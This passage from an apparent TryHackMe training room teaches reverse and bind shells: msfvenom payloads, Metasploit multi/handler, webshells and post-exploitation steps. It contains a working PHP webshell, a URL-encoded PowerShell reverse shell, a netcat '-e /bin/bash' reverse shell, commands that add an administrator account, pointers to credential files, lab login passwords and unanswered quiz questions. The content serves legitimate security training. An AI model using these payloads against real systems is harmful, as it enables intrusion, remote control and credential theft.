this:</p><p><code>linux/x86/meterpreter_reverse_tcp</code><br /></p><hr /><p>Aside from the <code>msfconsole</code> man page, the other important thing to note when working with msfvenom is: <br /></p><p><code>msfvenom --list payloads</code><br /></p><p>This can be used to list all available payloads, which can then be piped into <code>grep</code> to search for a specific set of payloads. For example:</p><p><img style="width:1076px" src="https://i.imgur.com/iFO6ydX.png" /></p><p>This gives us a full set of Linux meterpreter payloads for 32bit targets.</p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. Generate a staged reverse shell for a 64 bit Windows target, in a .exe format using your TryHackMe tun0 IP address and a chosen port.

```
```

2. Which symbol is used to show that a shell is stageless?

```
```

3. What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is elf and the output filename should be shell

```
```

----------------------------------------

### TASK 10. Metasploit multi/handler

<p>Multi/Handler is a superb tool for catching reverse shells. It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads.  </p><p>Fortunately, it's relatively easy to use:</p><ol><li>Open Metasploit with <code>msfconsole</code> </li><li>Type <code>use multi/handler</code>, and press enter</li></ol><p>We are now primed to start a multi/handler session. Let's take a look at the available options using the <code>options</code> command:</p><p><img style="width:719px" src="https://i.imgur.com/rAdZsKH.png" /></p><p>There are three options we need to set: payload, LHOST and LPORT. These are all identical to the options we set when generating  shellcode with Msfvenom -- a payload specific to our target, as well as a listening address and port with which we can receive a shell. Note that the LHOST <i>must</i> be specified here, as metasploit will not listen on all network interfaces like netcat or socat will; it must be told a specific address to listen with (when using TryHackMe, this will be your <a href="http://10.10.10.10" target="_blank">tun0 address</a>). We set these options with the following commands:</p><ul><li><code>set PAYLOAD &lt;payload&gt;</code></li><li><code>set LHOST &lt;listen-address&gt;</code></li><li><code>set LPORT &lt;listen-port&gt;</code></li></ul><p>We should now be ready to start the listener!</p><p>Let's do this by using the <code>exploit -j</code> command. This tells Metasploit to launch the module, running as a <b>j</b>ob in the background.</p><p><img style="width:750px" src="https://i.imgur.com/qIr6o2B.png" /><br /></p><p>You may notice that in the above screenshot, Metasploit is listening on a port under 1024. To do this, Metasploit <i>must</i> be run with sudo permissions.</p><p>When the staged payload generated in the previous task is run, Metasploit receives the connection, sending the remainder of the payload and giving us a reverse shell:</p><p><img style="width:878px" src="https://i.imgur.com/COmVX8K.png" /></p><p>Notice that, because the multi/handler was originally backgrounded, we needed to use <code>sessions 1</code> to foreground it again. This worked as it was the only session running. Had there been other sessions active, we would have needed to use <code>sessions</code> to see all active sessions, then use <code>sessions &lt;number&gt;</code> to select the appropriate session to foreground. This number would also have been displayed in the line where the shell was opened (see "<i>Command Shell session <b>1</b> opened</i>").<br /></p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. What command can be used to start a listener in the background?

```
```

2. If we had just received our tenth reverse shell in the current Metasploit session, what would be the command used to foreground it?

```
```

----------------------------------------

### TASK 11. WebShells

<p>There are times when we encounter websites that allow us an opportunity to upload, in some way or another, an executable file. Ideally we would use this opportunity to upload code that would activate a reverse or bind shell, but sometimes this is not possible. In these cases we would instead upload a <em>webshell</em>. See the <a href="https://tryhackme.com/room/uploadvulns">Upload Vulnerabilities Room</a> for a more extensive look at this concept.</p>
<p>"Webshell" is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server. Essentially, commands are entered into a webpage -- either through a HTML form, or directly as arguments in the URL -- which are then executed by the script, with the results returned and written to the page. This can be extremely useful if there are firewalls in place, or even just as a stepping stone into a fully fledged reverse or bind shell.</p>
<p>As PHP is still the most common server side scripting language, let's have a look at some simple code for this.</p>
<p>In a very basic one line format:</p>
<p><code>&lt;?php echo "&lt;pre&gt;" . shell_exec($_GET["cmd"]) . "&lt;/pre&gt;"; ?&gt;</code></p>
<p>This will take a GET parameter in the URL and execute it on the system with <code>shell_exec()</code>. Essentially, what this means is that any commands we enter in the URL after <code>?cmd=</code> will be executed on the system -- be it Windows or Linux. The "pre" elements are to ensure that the results are formatted correctly on the page.</p>
<p>Let's see this in action:</p>
<p><img src="https://i.imgur.com/W19gHwL.png" alt /></p>
<p>Notice that when navigating the shell, we used a GET parameter "cmd" with the command "ifconfig", which correctly returned the network information of the box. In other words, by entering the <code>ifconfig</code> command (used to check the network interfaces on a Linux target) into the URL of our shell, it was executed on the system, with the results returned to us. This would work for any other command we chose to use (e.g. <code>whoami</code>, <code>hostname</code>, <code>arch</code>, etc).</p>
<p>As mentioned previously, there are a variety of webshells available on Kali by default at <code>/usr/share/webshells</code> -- including the infamous <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" target="_blank">PentestMonkey php-reverse-shell</a> -- a full reverse shell written in PHP. Note that most generic, language specific (e.g. PHP) reverse shells are written for Unix based targets such as Linux webservers. They will not work on Windows by default.</p>
<p>When the target is Windows, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server. With the former method, obtaining RCE is often done with a URL Encoded Powershell Reverse Shell. This would be copied into the URL as the <code>cmd</code> argument:</p>
<p><code>powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27&lt;IP&gt;%27%2C&lt;PORT&gt;%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22</code></p>
<p>This is the same shell we encountered in Task 8, however, it has been URL encoded to be used safely in a GET parameter. Remember that the IP and Port (bold, towards end of the top line) will still need to be changed in the above code.</p>


----------------------------------------

### QUESTIONS:

----------------------------------------

1. Read the WebShells information.


```
```

----------------------------------------

### TASK 12. Next Steps

<p><u>Ok, we have a shell. Now what?</u><br /><br />
<br /><br />
We've covered lots of ways to generate, send and receive shells. The one thing that these all have in common is that they tend to be unstable and non-interactive. Even Unix style shells which are easier to stabilise are not ideal. So, what can we do about this?</p>
<p>On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at <code>/home/&lt;user&gt;/.ssh</code> are often an ideal way to do this. In CTFs it's also not infrequent to find credentials lying around somewhere on the box. Some exploits will also allow you to add your own account. In particular something like <a href="https://dirtycow.ninja/">Dirty C0w</a> or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.</p>
<p>On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at <code>C:\Program Files\FileZilla Server\FileZilla Server.xml</code><br />
 or <code>C:\xampp\FileZilla Server\FileZilla Server.xml</code><br />
. These can be MD5 hashes or in plaintext, depending on the version.</p>
<p>Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.</p>
<p>The syntax for this is as follows:</p>
<p><code>net user &lt;username&gt; &lt;password&gt; /add</code></p>
<p><code>net localgroup administrators &lt;username&gt; /add</code></p>
<hr />
<p><em><u>The important take away from this task:</u></em></p>
<p>Reverse and Bind shells are an essential technique for gaining remote code execution on a machine, however, they will never be as fully featured as a native shell. Ideally we always want to escalate into using a "normal" method for accessing the machine, as this will invariably be easier to use for further exploitation of the target.</p>


----------------------------------------

### QUESTIONS:

----------------------------------------

1. Read the above information


```
```

----------------------------------------

### TASK 13. Practice and Examples

<p>This room contained a lot of information, and gave you little opportunity to put it into practice throughout. The following two tasks contain virtual machines (one Ubuntu 18.04 server and one Windows server), each configured with a simple webserver with which you can upload and activate shells. This is a sandbox environment, so there will be no filters to bypass. Login credentials and instructions for each will also be given, should you wish to log in to practice with netcat, socat or meterpreter shells.</p>
<p>The remainder of this task will consist of shell examples for you to try out on the practice boxes.</p>


----------------------------------------

### QUESTIONS:

----------------------------------------

1. Try uploading a webshell to the Linux box, then use the command: nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash to send a reverse shell back to a waiting listener on your own machine.


```
```

2. Navigate to /usr/share/webshells/php/php-reverse-shell.php in Kali and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell.


```
```

3. Log into the Linux machine over SSH using the credentials in task 14. Use the techniques in Task 8 to experiment with bind and reverse netcat shells.


```
```

4. Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.


```
```

5. Look through Payloads all the Things and try some of the other reverse shell techniques. Try to analyse them and see why they work.


```
```

6. Switch to the Windows VM. Try uploading and activating the php-reverse-shell. Does this work?


```
```

7. Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.


```
```

8. The webserver is running with SYSTEM privileges. Create a new user and add it to the "administrators" group, then login over RDP or WinRM.


```
```

9. Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.


```
```

10. Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell.


```
```

11. Create both staged and stageless meterpreter shells for either target. Upload and manually activate them, catching the shell with netcat -- does this work?


```
```

----------------------------------------

### TASK 14. Linux Practice Box

<p>The box attached to this task is an Ubuntu server with a file upload page running on a webserver. This should be used to practice shell uploads on Linux systems. Equally, both socat and netcat are installed on this machine, so please feel free to log in via SSH on port 22 to practice with those directly. The credentials for logging in are:</p><ul><li><b>Username:</b> shell</li><li><b>Password: </b>TryH4ckM3!<br /></li></ul>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. No Answer Required

```
```

----------------------------------------

### TASK 15. Windows Practice Box

<p>This task contains a Windows 2019 Server box running a XAMPP webserver. This can be used to practice shell uploads on Windows. Again, both Socat and Netcat are installed, so feel free to log in over RDP or WinRM to practice with these. The credentials are:</p><p></p><ul><li><b>Username:</b> Administrator</li><li><b>Password: </b>TryH4ckM3!</li></ul><p>To login using RDP:</p><p><code>xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:Administrator /p:'TryH4ckM3!'</code><br /></p><p></p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. No answer required

```
```

